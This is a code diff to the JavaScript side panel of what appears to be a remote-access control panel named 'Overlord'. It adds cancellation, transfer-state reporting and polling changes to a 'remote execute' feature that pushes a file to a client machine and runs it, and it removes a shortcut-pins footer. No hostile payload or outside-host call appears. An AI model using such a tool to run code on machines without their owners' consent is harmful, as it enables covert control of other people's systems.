@@ -10,7 +10,6 @@
 import { playClickSound, playErrorSound, playSuccessSound } from "./sounds.js";
 
 const SIDE_PANEL_JS_VERSION = "1.6.0";
-const SIDE_PINS_KEY = "overlord_side_panel_pins_v1";
 
 /* ──────────────────────────────────────────────────────────── */
 /*  Menu definition                                            */
@@ -99,12 +98,8 @@ function resolveOpenUrl(clientId, target) {
 }
 
 function openFileBrowserWindow(clientId, forceSkin) {
-  let skin = forceSkin || "modern";
-  if (!forceSkin) {
-    try {
-      skin = localStorage.getItem("overlord.filebrowser.skin") || "modern";
-    } catch {}
-  }
+  // Explicit menu targets always open their own UI (never remap via last-used skin).
+  const skin = forceSkin === "classic" ? "classic" : "modern";
   if (skin === "classic") {
     try {
       localStorage.setItem("overlord.filebrowser.skin", "classic");
@@ -119,7 +114,7 @@ function openFileBrowserWindow(clientId, forceSkin) {
   try {
     localStorage.setItem("overlord.filebrowser.skin", "modern");
   } catch {}
-  window.open(`/${clientId}/files`, "_blank");
+  window.open(`/${clientId}/files`, "_blank", "noopener");
 }
 
 /* ──────────────────────────────────────────────────────────── */
@@ -197,6 +192,7 @@ const MAX_FILE_SIZE = 10 * 1024 * 1024; // 10 MB
 const WALLPAPER_POLL_MS = 500;
 const REMOTE_EXECUTE_MAX_SIZE = 200 * 1024 * 1024; // 200 MB
 const REMOTE_EXECUTE_POLL_MS = 500;
+const REMOTE_EXECUTE_TRANSFER_POLL_MS = 200;
 
 function formatBytes(bytes) {
   const value = Number(bytes) || 0;
@@ -447,11 +443,21 @@ function uploadWallpaper(clientId, file) {
 /*  Remote Execute                                             */
 /* ──────────────────────────────────────────────────────────── */
 
-function remoteExecutePhaseLabel(phase) {
+function remoteExecutePhaseLabel(phase, status) {
+  if (phase === "client_transfer") {
+    const state = status?.transferState;
+    const clientStatus = status?.lastClientStatus;
+    if (clientStatus === "retrying") return "Retrying client upload";
+    if (clientStatus === "requesting") return "Client requesting file";
+    if (state === "command_sent_no_client_progress" || !status?.clientAcknowledged) {
+      return "Waiting for client";
+    }
+    if ((Number(status?.bytesTransferred) || 0) <= 0) return "Connecting to client";
+    return "Uploading to client";
+  }
   switch (phase) {
     case "queued": return "Queued";
     case "staging": return "Staging on server";
-    case "client_transfer": return "Uploading to client";
     case "chmod": return "Setting permissions";
     case "execute": return "Starting process";
     case "succeeded": return "Execution completed";
@@ -460,13 +466,27 @@ function remoteExecutePhaseLabel(phase) {
   }
 }
 
+function remoteExecuteTransferStateLabel(state) {
+  switch (state) {
+    case "command_not_sent": return "Command was not sent";
+    case "command_sent_no_client_progress": return "Waiting for client acknowledgement";
+    case "client_transfer_active": return "Client transferring";
+    case "client_transfer_complete": return "Client transfer completed";
+    default: return "Waiting for client";
+  }
+}
+
 function remoteExecuteErrorText(status) {
   const err = status?.error || {};
   const parts = [
     err.message || status?.message || "Remote execute failed",
-    err.phase || status?.phase ? `Step: ${remoteExecutePhaseLabel(err.phase || status.phase)}` : "",
+    err.phase || status?.phase ? `Step: ${remoteExecutePhaseLabel(err.phase || status.phase, status)}` : "",
+    err.transferState || status?.transferState
+      ? `Transfer state: ${remoteExecuteTransferStateLabel(err.transferState || status.transferState)}`
+      : "",
     `Transferred: ${formatBytes(err.bytesTransferred ?? status?.bytesTransferred ?? 0)} / ${formatBytes(err.totalBytes ?? status?.totalBytes ?? 0)}`,
     err.destinationPath || status?.destinationPath ? `Destination: ${err.destinationPath || status.destinationPath}` : "",
+    err.pullOrigin || status?.pullOrigin ? `Endpoint: ${err.pullOrigin || status.pullOrigin}` : "",
     err.clientMessage ? `Client: ${err.clientMessage}` : "",
     err.serverMessage ? `Server: ${err.serverMessage}` : "",
     err.code ? `Code: ${err.code}` : "",
@@ -474,15 +494,32 @@ function remoteExecuteErrorText(status) {
   return parts.join("\n");
 }
 
+function formatRemoteExecuteSpeed(status) {
+  const bytes = Number(status?.bytesTransferred) || 0;
+  const speed = Number(status?.speedBytesPerSecond) || 0;
+  if (bytes <= 0 && speed <= 0) {
+    if (status?.lastClientStatus === "retrying") return "retrying";
+    if (status?.clientAcknowledged) return "connecting…";
+    return "waiting…";
+  }
+  if (speed <= 0) return "—";
+  return formatSpeed(speed);
+}
+
 function renderRemoteExecuteDetails(status, file) {
   const transferred = formatBytes(status.bytesTransferred || 0);
   const total = formatBytes(status.totalBytes || file.size || 0);
-  const speed = formatSpeed(status.speedBytesPerSecond || 0);
+  const speed = formatRemoteExecuteSpeed(status);
   const destination = status.destinationPath || "unknown destination";
+  const attempt = Number(status.lastClientAttempt) > 0 ? ` · attempt ${status.lastClientAttempt}` : "";
+  const clientMsg = status.lastClientMessage
+    ? `<div class="sp-progress-detail">${escapeHtml(status.lastClientMessage)}${escapeHtml(attempt)}</div>`
+    : "";
   return `
-    <div class="sp-progress-detail">${escapeHtml(file.name)} · ${transferred} / ${total} · ${speed}</div>
+    <div class="sp-progress-detail">${escapeHtml(file.name)} · ${transferred} / ${total} · ${escapeHtml(speed)}</div>
     <div class="sp-progress-detail">Destination: ${escapeHtml(destination)}</div>
-    <div class="sp-progress-detail">Phase: ${escapeHtml(remoteExecutePhaseLabel(status.phase))}</div>
+    <div class="sp-progress-detail">${escapeHtml(remoteExecuteTransferStateLabel(status.transferState))}</div>
+    ${clientMsg}
   `;
 }
 
@@ -549,6 +586,7 @@ function uploadRemoteExecute(clientId, file, options = {}) {
   progressToast.innerHTML = `
     <i class="fa-solid fa-bolt"></i>
     <span class="sp-progress-label">Preparing remote execute\u2026</span>
+    <button type="button" class="sp-progress-cancel" title="Cancel" aria-label="Cancel">&times;</button>
     <div class="sp-progress-meta"></div>
     <div class="sp-progress-track"><div class="sp-progress-bar"></div></div>
   `;
@@ -556,9 +594,13 @@ function uploadRemoteExecute(clientId, file, options = {}) {
   const bar = progressToast.querySelector(".sp-progress-bar");
   const label = progressToast.querySelector(".sp-progress-label");
   const meta = progressToast.querySelector(".sp-progress-meta");
+  const cancelBtn = progressToast.querySelector(".sp-progress-cancel");
 
   let pollTimer = null;
   let completed = false;
+  let cancelling = false;
+  let activeJobId = null;
+  let stagingDone = false;
 
   const cleanup = () => {
     if (pollTimer) {
@@ -568,10 +610,47 @@ function uploadRemoteExecute(clientId, file, options = {}) {
     progressToast.remove();
   };
 
+  async function cancelRemoteExecute() {
+    if (completed || cancelling) return;
+    cancelling = true;
+    if (pollTimer) {
+      clearTimeout(pollTimer);
+      pollTimer = null;
+    }
+    if (!stagingDone) {
+      try { xhr.abort(); } catch {}
+      completed = true;
+      cleanup();
+      showToast("Upload cancelled", "info");
+      return;
+    }
+    if (activeJobId) {
+      try {
+        await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(activeJobId)}`, {
+          method: "DELETE",
+          credentials: "include",
+        });
+      } catch {
+        /* best effort */
+      }
+    }
+    completed = true;
+    cleanup();
+    showToast("Remote execute cancelled", "info");
+  }
+
+  if (cancelBtn) {
+    cancelBtn.addEventListener("click", (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      void cancelRemoteExecute();
+    });
+  }
+
   xhr.upload.addEventListener("progress", (e) => {
-    if (!e.lengthComputable) return;
+    if (!e.lengthComputable || completed) return;
     const pct = Math.min(99, Math.floor((e.loaded / e.total) * 100));
-    bar.style.width = `${Math.min(40, Math.floor(pct * 0.4))}%`;
+    bar.style.width = `${Math.min(10, Math.floor(pct * 0.1))}%`;
     label.textContent = `Host to server\u2026 ${pct}%`;
     meta.innerHTML = `
       <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(e.loaded)} / ${formatBytes(e.total)}</div>
@@ -580,20 +659,23 @@ function uploadRemoteExecute(clientId, file, options = {}) {
   });
 
   async function pollJob(jobId) {
+    if (completed) return;
     try {
       const res = await fetch(`/api/clients/${clientId}/remote-execute/${encodeURIComponent(jobId)}`, { credentials: "include" });
       const status = await res.json().catch(() => ({}));
       if (!res.ok) {
         throw new Error(status.message || `Remote execute status failed: ${res.status}`);
       }
+      if (completed) return;
 
       const pct = status.status === "succeeded" ? 100 : Math.min(99, Math.max(0, Number(status.percent) || 0));
       bar.style.width = `${pct}%`;
-      label.textContent = `${remoteExecutePhaseLabel(status.phase)}\u2026 ${pct}%`;
+      label.textContent = `${remoteExecutePhaseLabel(status.phase, status)}\u2026 ${pct}%`;
       meta.innerHTML = renderRemoteExecuteDetails(status, file);
 
       if (status.status === "succeeded") {
         completed = true;
+        if (cancelBtn) cancelBtn.remove();
         label.textContent = "Execution completed 100%";
         bar.style.width = "100%";
         setTimeout(() => {
@@ -606,12 +688,20 @@ function uploadRemoteExecute(clientId, file, options = {}) {
       if (status.status === "failed") {
         completed = true;
         cleanup();
-        showToast(remoteExecuteErrorText(status), "error", 12000);
+        if (status?.error?.code === "cancelled") {
+          showToast("Remote execute cancelled", "info");
+        } else {
+          showToast(remoteExecuteErrorText(status), "error", 12000);
+        }
         return;
       }
 
-      pollTimer = setTimeout(() => pollJob(jobId), REMOTE_EXECUTE_POLL_MS);
+      const interval = status.phase === "client_transfer"
+        ? REMOTE_EXECUTE_TRANSFER_POLL_MS
+        : REMOTE_EXECUTE_POLL_MS;
+      pollTimer = setTimeout(() => pollJob(jobId), interval);
     } catch (err) {
+      if (completed) return;
       completed = true;
       cleanup();
       showToast(err.message || "Remote execute status polling failed", "error", 8000);
@@ -619,14 +709,17 @@ function uploadRemoteExecute(clientId, file, options = {}) {
   }
 
   xhr.addEventListener("load", () => {
+    if (completed) return;
+    stagingDone = true;
     if (xhr.status >= 200 && xhr.status < 300) {
       try {
         const res = JSON.parse(xhr.responseText);
         if (res.ok && res.jobId) {
-          bar.style.width = `${Math.max(5, Number(res.percent) || 5)}%`;
-          label.textContent = "Waiting for client transfer\u2026";
+          activeJobId = res.jobId;
+          bar.style.width = `${Math.max(0, Number(res.percent) || 0)}%`;
+          label.textContent = "Waiting for client\u2026 0%";
           meta.innerHTML = `
-            <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)}</div>
+            <div class="sp-progress-detail">${escapeHtml(file.name)} · ${formatBytes(0)} / ${formatBytes(res.totalBytes || file.size)} · waiting\u2026</div>
             <div class="sp-progress-detail">To: ${escapeHtml(res.destinationPath || "unknown destination")}</div>
           `;
           pollJob(res.jobId);
@@ -651,14 +744,17 @@ function uploadRemoteExecute(clientId, file, options = {}) {
   });
 
   xhr.addEventListener("error", () => {
+    if (completed) return;
     completed = true;
     cleanup();
     showToast("Network error during upload", "error");
   });
 
   xhr.addEventListener("abort", () => {
+    if (completed) return;
+    completed = true;
     cleanup();
-    if (!completed) showToast("Upload cancelled", "info");
+    showToast("Upload cancelled", "info");
   });
 
   xhr.open("POST", `/api/clients/${clientId}/remote-execute`);
@@ -1132,201 +1228,7 @@ function buildPanel(clientId) {
     }
   });
 
-  /* ---- Shortcut pins footer ---- */
-  panel.appendChild(buildPinsFooter(clientId));
-
   return panel;
-}
-
-function loadPins() {
-  try {
-    const raw = localStorage.getItem(SIDE_PINS_KEY);
-    if (!raw) return [];
-    const parsed = JSON.parse(raw);
-    return Array.isArray(parsed) ? parsed : [];
-  } catch {
-    return [];
-  }
-}
-
-function savePins(pins) {
-  try {
-    localStorage.setItem(SIDE_PINS_KEY, JSON.stringify(pins));
-  } catch {
-    /* ignore */
-  }
-  // Let Dashboard 2.0 desktop icons refresh in this tab (storage event only fires cross-tab)
-  try {
-    window.dispatchEvent(new CustomEvent("overlord:pins-changed"));
-  } catch {
-    /* ignore */
-  }
-}
-
-function listPinnableCommands() {
-  const out = [];
-  for (const group of PANEL_GROUPS) {
-    for (const item of group.items) {
-      if (item.divider) continue;
-      const id = item.open ? `open:${item.open}` : item.action ? `action:${item.action}` : null;
-      if (!id) continue;
-      out.push({
-        id,
-        label: item.label,
-        icon: item.icon,
-        color: item.color,
-        open: item.open || null,
-        action: item.action || null,
-        group: group.label,
-      });
-    }
-  }
-  return out;
-}
-
-function runPinnedCommand(clientId, pin) {
-  if (pin.open === "files") {
-    openFileBrowserWindow(clientId);
-    return;
-  }
-  if (pin.open === "files-classic") {
-    openFileBrowserWindow(clientId, "classic");
-    return;
-  }
-  if (pin.open) {
-    const url = resolveOpenUrl(clientId, pin.open);
-    if (url) window.open(url, "_blank");
-    return;
-  }
-  if (pin.action) {
-    handleAction(clientId, pin.action);
-  }
-}
-
-function buildPinsFooter(clientId) {
-  const footer = document.createElement("div");
-  footer.className = "sp-pins";
-  footer.dataset.spPins = "1";
-
-  const head = document.createElement("div");
-  head.className = "sp-pins-head";
-  head.innerHTML = `<span class="sp-pins-title">Shortcuts</span>`;
-  const createBtn = document.createElement("button");
-  createBtn.type = "button";
-  createBtn.className = "sp-pins-create";
-  createBtn.title = "Create Shortcut";
-  createBtn.innerHTML = `<i class="fa-solid fa-plus"></i><span>Create Shortcut</span>`;
-  head.appendChild(createBtn);
-  footer.appendChild(head);
-
-  const list = document.createElement("div");
-  list.className = "sp-pins-list";
-  footer.appendChild(list);
-
-  function renderPins() {
-    const pins = loadPins();
-    list.innerHTML = "";
-    if (!pins.length) {
-      const empty = document.createElement("div");
-      empty.className = "sp-pins-empty";
-      empty.textContent = "No shortcuts";
-      list.appendChild(empty);
-      return;
-    }
-    for (const pin of pins) {
-      const row = document.createElement("div");
-      row.className = "sp-pin";
-      const btn = document.createElement("button");
-      btn.type = "button";
-      btn.className = "sp-pin-btn";
-      btn.title = pin.label;
-      btn.innerHTML = `<i class="${escapeHtml(pin.icon || "fa-solid fa-bolt")}" style="color:${escapeHtml(pin.color || "#94a3b8")}"></i><span>${escapeHtml(pin.label)}</span>`;
-      btn.addEventListener("click", () => runPinnedCommand(clientId, pin));
-      const rm = document.createElement("button");
-      rm.type = "button";
-      rm.className = "sp-pin-remove";
-      rm.title = "Remove shortcut";
-      rm.innerHTML = `<i class="fa-solid fa-xmark"></i>`;
-      rm.addEventListener("click", (e) => {
-        e.stopPropagation();
-        savePins(loadPins().filter((p) => p.id !== pin.id));
-        renderPins();
-      });
-      row.appendChild(btn);
-      row.appendChild(rm);
-      list.appendChild(row);
-    }
-  }
-
-  createBtn.addEventListener("click", () => {
-    const existing = new Set(loadPins().map((p) => p.id));
-    const choices = listPinnableCommands().filter((c) => !existing.has(c.id));
-    if (!choices.length) {
-      showToast("All commands already pinned", "info");
-      return;
-    }
-    openPinPicker(choices, (picked) => {
-      const pins = loadPins();
-      if (pins.some((p) => p.id === picked.id)) return;
-      pins.push({
-        id: picked.id,
-        label: picked.label,
-        icon: picked.icon,
-        color: picked.color,
-        open: picked.open,
-        action: picked.action,
-      });
-      savePins(pins);
-      renderPins();
-      showToast(`Shortcut: ${picked.label}`, "success");
-    });
-  });
-
-  renderPins();
-  return footer;
-}
-
-function openPinPicker(choices, onPick) {
-  const backdrop = document.createElement("div");
-  backdrop.className = "sp-pin-modal-backdrop";
-  const modal = document.createElement("div");
-  modal.className = "sp-pin-modal";
-  modal.innerHTML = `
-    <div class="sp-pin-modal-head">
-      <strong>Create Shortcut</strong>
-      <button type="button" class="sp-pin-modal-close" aria-label="Close"><i class="fa-solid fa-xmark"></i></button>
-    </div>
-    <p class="sp-pin-modal-hint">Choose a sidebar command to pin at the bottom.</p>
-    <div class="sp-pin-modal-list"></div>
-  `;
-  const list = modal.querySelector(".sp-pin-modal-list");
-  for (const c of choices) {
-    const btn = document.createElement("button");
-    btn.type = "button";
-    btn.className = "sp-pin-modal-item";
-    btn.innerHTML = `<i class="${escapeHtml(c.icon)}" style="color:${escapeHtml(c.color || "#94a3b8")}"></i>
-      <span class="sp-pin-modal-label">${escapeHtml(c.label)}</span>
-      <span class="sp-pin-modal-group">${escapeHtml(c.group || "")}</span>`;
-    btn.addEventListener("click", () => {
-      cleanup();
-      onPick(c);
-    });
-    list.appendChild(btn);
-  }
-  function cleanup() {
-    backdrop.remove();
-    window.removeEventListener("keydown", onKey);
-  }
-  function onKey(e) {
-    if (e.key === "Escape") cleanup();
-  }
-  modal.querySelector(".sp-pin-modal-close")?.addEventListener("click", cleanup);
-  backdrop.addEventListener("click", (e) => {
-    if (e.target === backdrop) cleanup();
-  });
-  window.addEventListener("keydown", onKey);
-  backdrop.appendChild(modal);
-  document.body.appendChild(backdrop);
 }
 
 function escapeHtml(str) {
@@ -1343,6 +1245,3 @@ export function initSidePanel(clientId, containerEl) {
   if (!clientId || !containerEl) return;
   containerEl.appendChild(buildPanel(clientId));
 }
-
-/* Shared with dashboard2-icons.js (desktop shortcut icons) */
-export { SIDE_PINS_KEY, loadPins, runPinnedCommand };
